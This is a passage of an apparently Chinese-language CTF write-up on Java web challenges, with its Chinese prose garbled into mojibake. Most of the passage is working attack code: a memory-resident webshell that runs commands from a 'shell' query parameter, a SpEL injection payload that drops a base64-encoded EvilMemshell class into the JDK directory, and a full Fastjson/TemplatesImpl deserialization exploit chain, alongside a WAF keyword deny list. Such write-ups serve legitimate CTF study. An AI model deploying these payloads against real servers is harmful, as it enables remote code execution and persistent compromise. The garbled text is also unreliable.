class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange httpExchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> httpExchange.getRequestURI().getQuery();<br>        String[] split = query.split(<span class="hljs-string">&quot;=&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SUCCESS&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">if</span> (split[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;shell&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> split[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> flag=-<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span>((flag=inputStream.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>                byteArrayOutputStream.write(bytes,<span class="hljs-number">0</span>,flag);<br>            &#125;<br>            response += byteArrayOutputStream.toString();<br>            byteArrayOutputStream.close();<br>        &#125;<br>        httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>,response.length());<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>        outputStream.write(response.getBytes());<br>        outputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SPELæ³¨å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">payload=T(com.sun.org.apache.xml.internal.security.utils.JavaUtils).writeBytesToFilename(<span class="hljs-string">&quot;/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/EvilMemshell.class&quot;</span>,T(java.util.Base64).getDecoder.decode(<span class="hljs-string">&quot;yv66vgAAADQA6QoAOQBXCgBYAFkKAFgAWgoAOQBbCABcCgBdAF4KAF8AYAoAXwBhBwBiCABjCABkCABlCABmBwBnCgAOAGgIAGkKAF8AagcAawcAbAoAEwBXBwBtCgAVAG4KABUAbwoAFQBwCgBxAHIKABMAcwoAdAB1CQB2AHcHAHgKAB0AVwoAHQB5CgB6AHsKAHwAfQoAfgB/CACACgCBAIIIAIMIAIQKAIEAhQoAhgCHCgCGAIgKAIkAigoAiwCMCgATAI0HAI4KAC0AVwoALQCPCgATAJAKAC0AkAoAEwBwCgCBAJEKAHwAkgoAfACTCgCBAJQKAJUAlgoAlQBwBwCXBwCYBwCZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAA1TdGFja01hcFRhYmxlBwBrAQAKRXhjZXB0aW9ucwcAmgcAmwcAnAEADGJhc2U2NHNlcmlhbAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAZoYW5kbGUBACgoTGNvbS9zdW4vbmV0L2h0dHBzZXJ2ZXIvSHR0cEV4Y2hhbmdlOylWBwB4BwCdBwCeBwCfBwCgBwChBwBsAQAKU291cmNlRmlsZQEAEUV2aWxNZW1zaGVsbC5qYXZhDAA8AD0HAKIMAKMApAwApQCmDACnAKgBAAd0aHJlYWRzBwCpDACqAKsHAKwMAK0ArgwArwCwAQATW0xqYXZhL2xhbmcvVGhyZWFkOwEABnRhcmdldAEABnRoaXMkMAEACGNvbnRleHRzAQAEbGlzdAEAFGphdmEvdXRpbC9MaW5rZWRMaXN0DACvALEBAAdoYW5kbGVyDACyALMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BABpqYXZhL2lvL09iamVjdE91dHB1dFN0cmVhbQwAPAC0DAC1ALYMALcAPQcAuAwAuQC8DAC9AL4HAL8MAMAAwQcAwgwAwwDEAQAMRXZpbE1lbXNoZWxsDABIAEkHAMUMAMYAxwcAnQwAyADJBwDKDADLAMwBAAE9BwCeDADNAM4BAAhTVUNDRVNTCgEABXNoZWxsDADPANAHANEMANIA0wwA1ADVBwDWDADXANgHAKAMANkA2gwA2wDcAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAN0A3gwA3wDMDADgAOEMAOIA4wwA5ADlDADmAL4HAOcMANsA6AEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAImNvbS9zdW4vbmV0L2h0dHBzZXJ2ZXIvSHR0cEhhbmRsZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BACNjb20vc3VuL25ldC9odHRwc2VydmVyL0h0dHBFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQALd3JpdGVPYmplY3QBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAVjbG9zZQEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBAAt0b0J5dGVBcnJheQEABCgpW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1nZXRSZXF1ZXN0VVJJAQAQKClMamF2YS9uZXQvVVJJOwEADGphdmEvbmV0L1VSSQEACGdldFF1ZXJ5AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEABmxlbmd0aAEAAygpSQEAE3NlbmRSZXNwb25zZUhlYWRlcnMBAAUoSUopVgEAD2dldFJlc3BvbnNlQm9keQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGdldEJ5dGVzAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAUoW0IpVgAhAB0AOQACADoAOwAAAAUAAQA8AD0AAQA+AAAAHQABAAEAAAAFKrcAAbEAAAABAD8AAAAGAAEAAAAIAAIAQABBAAIAPgAAAUoAAwANAAAAv7gAArYAA00stgAEEgW2AAZOLQS2AActLLYACMAACcAACToEGQQEMjoFGQW2AAQSCrYABjoGGQYEtgAHGQYZBbYACDoHGQe2AAQSC7YABjoIGQgEtgAHGQgZB7YACDoHGQe2AAQSDLYABjoJGQkEtgAHGQkZB7YACDoHGQe2AAQSDbYABjoKGQoEtgAHGQoZB7YACMAADjoLGQsDtgAPOgcZB7YABBIQtgAGOgwZDAS2AAcZDBkHKrYAEacABE2xAAEAAAC6AL0AEgACAD8AAABiABgAAAALAAcADAARAA0AFgAOACMADwApABEANQASADsAEwBEABUAUAAWAFYAFwBfABkAawAaAHEAGwB6AB0AhgAeAIwAHwCYACAAoAAiAKwAIwCyACQAugAmAL0AJQC+ACcAQgAAAAkAAvcAvQcAQwAARAAAAAgAAwBFAEYARwAJAEgASQACAD4AAABTAAMABAAAACe7ABNZtwAUTLsAFVkrtwAWTSwqtgAXLLYAGLgAGSu2ABq2ABtOLbAAAAABAD8AAAAaAAYAAAApAAgAKgARACsAFgAsABoALgAlAC8ARAAAAAQAAQASAAkASgBLAAIAPgAAAC0AAwABAAAAEbIAHLsAHVm3AB64AB+2ACCxAAAAAQA/AAAACgACAAAANAAQADUARAAAAAQAAQASAAEATABNAAIAPgAAAT0ABAAKAAAAnyu2ACG2ACJNLBIjtgAkThIlOgQtAzISJrYAJ5kAYS0EMjoFuAAoGQW2ACm2ACo6BhEEALwIOge7ABNZtwAUOggCNgkZBhkHtgArWTYJAp8AEBkIGQcDFQm2ACyn/+i7AC1ZtwAuGQS2AC8ZCLYAMLYAL7YAMToEGQi2ADIrEQDIGQS2ADOFtgA0K7YANToFGQUZBLYANrYANxkFtgA4sQAAAAIAPwAAAEoAEgAAADkACAA6AA8AOwATADwAHgA9ACMAPgAwAD8ANwBAAEAAQQBDAEIAUQBDAF4ARQB3AEYAfABIAIkASQCPAEoAmQBLAJ4ATABCAAAAPAAD/wBDAAoHAE4HAE8HAFAHAFEHAFAHAFAHAFIHAFMHAFQBAAAa/wAdAAUHAE4HAE8HAFAHAFEHAFAAAABEAAAABAABAEYAAgBVAAAAAgBWALsAAAAKAAEAdABxALoACQ==&quot;</span>))<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥æ‰“ååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">unser=rO0ABXNyAAxFdmlsTWVtc2hlbGwx3CJ1tyzvvgIAAHhw<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240925204348301.png" alt="image-20240925204348301"></p><p>æä¸€å˜´ï¼Œè™½ç„¶ä»–çš„wafç»™banäº†å¾ˆå¤šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySecurityWaf</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; denychar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-string">&quot;java.lang&quot;</span>, <span class="hljs-string">&quot;Runtime&quot;</span>, <span class="hljs-string">&quot;org.springframework&quot;</span>, <span class="hljs-string">&quot;javax.naming&quot;</span>, <span class="hljs-string">&quot;Process&quot;</span>, <span class="hljs-string">&quot;ScriptEngineManager&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;replace&quot;</span>, <span class="hljs-string">&quot;JavaWrapper&quot;</span>, <span class="hljs-string">&quot;System&quot;</span>));<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MySecurityWaf</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">securitycheck</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> UnsupportedEncodingException &#123;<br>        <span class="hljs-keyword">if</span> (payload.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">reals</span> <span class="hljs-operator">=</span> URLDecoder.decode(payload, <span class="hljs-string">&quot;UTF-8&quot;</span>).toUpperCase(Locale.ROOT);<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denychar.size(); ++i) &#123;<br>                <span class="hljs-keyword">if</span> (reals.toUpperCase(Locale.ROOT).contains(((String)<span class="hljs-built_in">this</span>.denychar.get(i)).toUpperCase(Locale.ROOT))) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®è¿˜å¯ä»¥è€ƒè™‘æ‹¼æ¥ç»•ï¼Œä½†è¿™é“é¢˜ä¸å‡ºç½‘ã€‚</p><h2 id="CISCN2024-AWDP-SolonMater"><a href="#CISCN2024-AWDP-SolonMater" class="headerlink" title="CISCN2024-AWDP-SolonMater"></a>CISCN2024-AWDP-SolonMater</h2><p>é‡èµ°å½“å¹´è·¯ï¼Œå¦‚æœæˆ‘å¤šçœ‹çœ‹ä¹Ÿè®¸å°±å‡ºäº†å§ã€‚</p><p>é‚£ä¹ˆç¬¬äºŒå¤©å† å†›åº”è¯¥å°±ä¸ä¼šé‚£ä¹ˆæå¿ƒåŠèƒ†åœ°æ‹¿äº†å§ã€‚</p><p>ä½†æ˜¯å¦‚æœæ²¡æœ‰å‰é¢çš„å¤±åˆ©ï¼Œåˆæ€èƒ½è®©æˆ‘ç ´é‡œæ²‰èˆŸâ€¦â€¦</p><p>è·‘é¢˜äº†ï¼Œå›æ¥çœ‹é¢˜ã€‚</p><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿®è¿˜æ˜¯å¥½ä¿®ï¼Œä¸Šä¸ª<code>snake</code>å’Œ<code>log</code>çš„é»‘åå•å°±å®Œäº†ã€‚</p><p>æˆ‘è¿˜æ˜¯ä»¥é˜²ä¸‡ä¸€æŠŠå¾ˆå¤šfjé“¾çš„ä¸œè¥¿ä¹Ÿbanäº†ã€‚</p><p><code>DemoController.class</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011172524360.png" alt="image-20241011172524360"></p><p>æ¼æ´ç‚¹ä½å¾ˆæ˜æ˜¾ï¼Œä¼ ä¸ªjsonçš„base64åºåˆ—åŒ–å­—ç¬¦ä¸²å°±æ‹¿å»æ¢­äº†ã€‚</p><p>å…¶å®è¿™é“attackè¿˜æ˜¯æ‰“fjåŸç”Ÿååºåˆ—åŒ–ï¼Œåªæ˜¯BadAttributeè¿™ä¸ªç©æ„è¢«banäº†ï¼Œå‰é¢Userç±»è¿›å°±ä¸ºæ‰€æ¬²ä¸ºäº†ã€‚</p><p>æœ¬æ¥fastjson1.2.80æˆ‘çœ‹åˆ°æ‰“JNDIçš„å¾ˆå¤šï¼Œä½†è¿™é‡Œç›´æ¥ç»™äº†ååºåˆ—åŒ–çš„ä½ç½®ï¼Œå°±æŒ‰ä»–è¿™ä¸ªæ¥å§ã€‚</p><h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonArray);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br>        <span class="hljs-comment">//BadAttributeValueExpException bd = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">//setValue(bd,&quot;val&quot;,jsonArray);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,eventListenerList);<br>        setValue(a, <span class="hljs-string">&quot;info&quot;</span>, hashMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(a);<br>        objectOutputStream.close();<br><br>        <span class="hljs-comment">// Base64 encode the serialized data</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64Encoded</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(base64Encoded);<br><br>        deserialize(base64Encoded);<br>        <span class="hljs-comment">//HackerClass:class java.util.HashMap</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011172403868.png" alt="image-20241011172403868"></p><p>ç›å¾·EventlistenerListçœŸå¥½ç”¨ï¼Œåªè¦ä¸banåŸºæœ¬åŸç”Ÿé“¾é€šæ€äº†ã€‚</p><p>ä½†è¿™é“é¢˜è¦æ‰“è¿›å»è¿˜è¦bypassä¸€ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">map.size() != jsonObject.length()<br></code></pre></td></tr></table></figure><p>æŒ‰é“ç†æ¥è¯´ï¼Œä½ ç›´æ¥POSTä¼ å‚ï¼Œè¿™ä¿©æ˜¯ä¸€æ ·çš„ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/3999180f5aa7cc6e56dbe3d20b6eef3a.png" alt="img"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/e9e0c81c3e288190c5e69896008bafaa.png" alt="img"></p><p>é‚£å’‹åŠå‘¢ï¼Ÿ</p><p>æƒ³åˆ°äº†fastjsonçš„<code>@type</code>ã€‚</p><p>å› ä¸ºfastjsonä¼šé»˜è®¤<code>@type</code>ä½œä¸ºé”®çš„åé¢çš„å€¼æ‹¿å»ååºåˆ—åŒ–ï¼Œè™½ç„¶è¿™é‡Œæˆ‘ä»¬æ¬§é˜³å­¦é•¿ä¹Ÿè·Ÿäº†ä¸€ä¸‹å‘ç°<code>@type</code>è¢«banäº†ï¼Œä½†æ˜¯è¿™é‡Œåªæ˜¯ç”¨å»ç»•è¿™ä¸ªåˆ¤æ–­ï¼Œè¿™é‡Œfastjsonå°±ä¼šåªè®¤dataçš„é”®å€¼å¯¹ï¼Œæ‰€ä»¥é•¿åº¦ä¸º1ï¼Œä½†map.size()&#x3D;2ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011233845225.png" alt="image-20241011233845225"></p><p>è®°å½•ä¸€ä¸ªå°æ’æ›²ï¼šå¼€å§‹èµµå“¥ç»™å‡ºè¿™ä¸ªç©æ„çš„æ—¶å€™æˆ‘å…ˆå»è¯•äº†è¯•å‘ç°å¤±è´¥äº†ï¼Œåé¢æ‰å‘ç°æ˜¯javaç‰ˆæœ¬æŠ¥çš„é”™ï¼Œç›å¾·å‰é¢ç”¨java17å¿˜äº†æ¢å›æ¥å¼€çš„jaråŒ…ï¼Œæœ‰ç‚¹æ‹›ç¬‘äº†ã€‚ã€‚ã€‚ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234010762.png" alt="image-20241011234010762"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234048139.png" alt="image-20241011234048139"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234107773.png" alt="image-20241011234107773"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234121961.png" alt="image-20241011234121961"></p><p>æ”¾dockerä¹Ÿä¸€æ ·ï¼Œéšä¾¿é€šï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234215714.png" alt="image-20241011234215714"></p><h2 id="DASCTF2024-0rays-Ezlogin"><a href="#DASCTF2024-0rays-Ezlogin" class="headerlink" title="DASCTF2024-0rays-Ezlogin"></a>DASCTF2024-0rays-Ezlogin</h2><p>å…¶å®éå¸¸ç®€å•çš„ä¸€é“æ‰“readObjectXMLçš„é¢˜ç›®ï¼Œè€Œä¸”æ ¹æ®è¿™ä¸ªhutoolç‰ˆæœ¬æ˜¯5.8.11å°±èƒ½æ‰¾åˆ°ç½‘ä¸Šç°æˆçš„CVE-POCï¼š<a href="https://blog.csdn.net/LJQClqjc/article/details/128855805">æ¼æ´æ·±åº¦åˆ†æ|CVE-2023-24162 hutool XMLååºåˆ—åŒ–æ¼æ´_cve-2023â€ åˆ†æ-CSDNåšå®¢</a>ã€‚</p><p>è€Œä¸”ä¾èµ–ä¸­æœ‰Jackson2.13ï¼Œå¯ä»¥æ‰“è¿™ä¸ªJacksonçš„ååºåˆ—åŒ–æ¼æ´ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œæœ€åä½ è¦ç»•è¿™ä¸ªé•¿åº¦é™åˆ¶ï¼Œæ¯”èµ›æ—¶ä¹Ÿæ˜¯0è§£ï¼Œåº”è¯¥éƒ½æ˜¯å¡åœ¨äº†è¿™é‡Œã€‚</p><p>æ¼æ´ç‚¹åœ¨è¿™é‡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 